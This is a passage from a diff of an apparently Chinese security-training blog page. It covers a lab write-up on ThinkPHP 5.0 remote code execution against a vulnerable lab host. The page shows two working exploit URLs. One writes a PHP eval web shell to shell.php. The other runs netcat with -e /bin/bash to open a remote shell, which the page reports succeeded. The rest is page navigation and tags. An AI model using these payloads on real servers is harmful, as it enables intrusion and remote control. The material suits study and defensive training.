 <figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="string">0</span>]=system&amp;vars[1][]=echo ^&lt;?php @eval($<span class="emphasis">_GET["code"])?^&gt;&gt;shell.php</span></span><br></pre></td></tr></table></figure>
 
 <p>尝试正向shell。</p>
 <figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=nc -lvp 31328 -e /bin/bash</span><br></pre></td></tr></table></figure>
 
-<p><img src="/assets/image-20200426190529727.png" alt="image-20200426190529727"></p>
+<p><img src="/assets/image-20200426190529727-1588323655198.png" alt="image-20200426190529727"></p>
 <p>正向shell成功。</p>
 
     </div>
@@ -561,9 +570,21 @@
     
     
       
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\web\合天培训_实验_web安全之HTTP头部字段理解\" rel="bookmark">实验_web安全之HTTP头部字段理解</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\uncategorized\合天培训_实验_文件包含漏洞\" rel="bookmark">实验-文件包含漏洞</a></div>
+    </li>
+  </ul>
 
 
       <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag"># web安全</a>
+          </div>
 
         
 
@@ -571,13 +592,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/uncategorized/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD-%E5%AE%9E%E9%AA%8C-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E8%80%83%E6%A0%B8/" rel="prev" title="合天培训_实验_上传文件考核">
-      <i class="fa fa-chevron-left"></i> 合天培训_实验_上传文件考核
+    <a href="/uncategorized/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD-%E5%AE%9E%E9%AA%8C-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="prev" title="合天培训_实验_命令执行">
+      <i class="fa fa-chevron-left"></i> 合天培训_实验_命令执行
     </a></div>
-      <div class="post-nav-item">
-    <a href="/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD-%E5%AE%9E%E9%AA%8C-sql%E6%B3%A8%E5%85%A5/" rel="next" title="合天培训_实验_sql注入">
-      合天培训_实验_sql注入 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
